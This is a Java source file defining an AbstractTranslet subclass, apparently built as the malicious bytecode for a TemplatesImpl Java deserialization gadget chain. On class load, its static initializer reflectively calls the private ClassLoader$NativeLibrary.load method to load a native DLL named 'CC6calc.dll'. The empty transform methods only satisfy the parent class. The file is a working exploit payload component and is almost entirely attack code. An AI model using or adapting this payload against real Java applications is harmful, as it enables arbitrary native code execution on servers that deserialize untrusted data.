import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class TemplatesImpl_loadDLL extends AbstractTranslet {
    static{
        try {
            String file = "CC6calc.dll";
            Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Constructor con = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
            con.setAccessible(true);
            Object obj = con.newInstance(Class.class,file,true);
            Method method = obj.getClass().getDeclaredMethod("load", String.class, boolean.class);
            method.setAccessible(true);
            method.invoke(obj, file, false);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }
    public TemplatesImpl_loadDLL(){}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
